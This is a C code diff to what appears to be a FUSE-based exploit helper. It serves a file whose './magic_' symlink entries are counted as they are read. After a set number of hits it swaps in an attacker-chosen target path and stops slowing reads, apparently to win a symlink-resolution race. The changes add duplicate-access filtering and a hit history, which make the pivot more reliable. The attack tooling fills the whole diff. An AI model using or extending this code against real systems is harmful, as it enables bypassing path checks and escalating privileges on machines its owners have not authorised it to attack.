@@ -15,13 +15,18 @@
 #include <signal.h>
 
 #define DEFAULT_SYMLINK_PATTERN "./magic_"
+#define MAX_SYMLINKS 39
+#define HISTORY_SIZE 10
 
 static const char *filepath = "/path_pivot.img";
 static const char *filename = "path_pivot.img";
 
 // Hits.
-static unsigned symlink_hits[40];
+static unsigned symlink_hits[MAX_SYMLINKS];
+static unsigned hit_history[HISTORY_SIZE];
+static unsigned history_idx = 0;
 static int nr_reads = 0;
+
 
 // Output log.
 static int logfd = STDERR_FILENO;
@@ -42,8 +47,11 @@ static void sighup_handler(int __attribute__((unused)) code)
 {
     dprintf(logfd, "Received SIGHUP signal, reseting.\n");
 
-    nr_reads = 0;
     memset(symlink_hits, 0, sizeof(symlink_hits));
+    memset(hit_history, 0, sizeof(hit_history));
+
+    nr_reads = 0;
+    history_idx = 0;
 
     enable_slowdown = true;
 }
@@ -91,6 +99,24 @@ static int open_callback(const char *path, struct fuse_file_info *fi)
     return 0;
 }
 
+static void symlink_hit(unsigned n)
+{
+    if ( n == 0 || n > MAX_SYMLINKS )
+        return;
+
+    symlink_hits[n - 1]++;
+    hit_history[history_idx++ % HISTORY_SIZE] = n;
+}
+
+static bool is_duplicate(unsigned n)
+{
+    for ( int i = 0; i < HISTORY_SIZE; i++ )
+        if ( hit_history[i] == n )
+            return true;
+
+    return false;
+}
+
 static int is_symlink(char *buf, size_t size)
 {
     if ( size < pattern_size )
@@ -99,15 +125,19 @@ static int is_symlink(char *buf, size_t size)
     for ( size_t i = 0; i < size - pattern_size; i++ )
     {
         if ( memcmp(symlink_pattern, buf + i, pattern_size) == 0 ) {
-                unsigned symlink_idx = strtoul(buf + i + pattern_size, NULL, 10);
-                if ( symlink_idx == 0 || symlink_idx > 40 )
+                unsigned symlink_num = strtoul(buf + i + pattern_size, NULL, 10);
+                if ( symlink_num == 0 || symlink_num > MAX_SYMLINKS )
                     break;
                     
-                symlink_hits[symlink_idx-1]++;
+                if ( is_duplicate(symlink_num) ) {
+                    dprintf(logfd, "\n[*] Ignoring duplicate access to %s.\n", buf + i);
+                    break;
+                }
 
-                dprintf(logfd, "[*] Detected pattern %s (hit: %d)\n", buf + i, symlink_hits[symlink_idx-1]);
+                symlink_hit(symlink_num);
+                dprintf(logfd, "\n[*] Detected pattern %s (hit: %d)\n", buf + i, symlink_hits[symlink_num-1]);
 
-                if ( symlink_idx == 40 && symlink_hits[symlink_idx-1] >= nr_pass ) {
+                if ( symlink_num == MAX_SYMLINKS && symlink_hits[symlink_num-1] >= nr_pass ) {
                     dprintf(logfd, "[*] Pivoting symlink to %s\n", target);
                     strcpy(buf + i, target);
                     enable_slowdown = false;
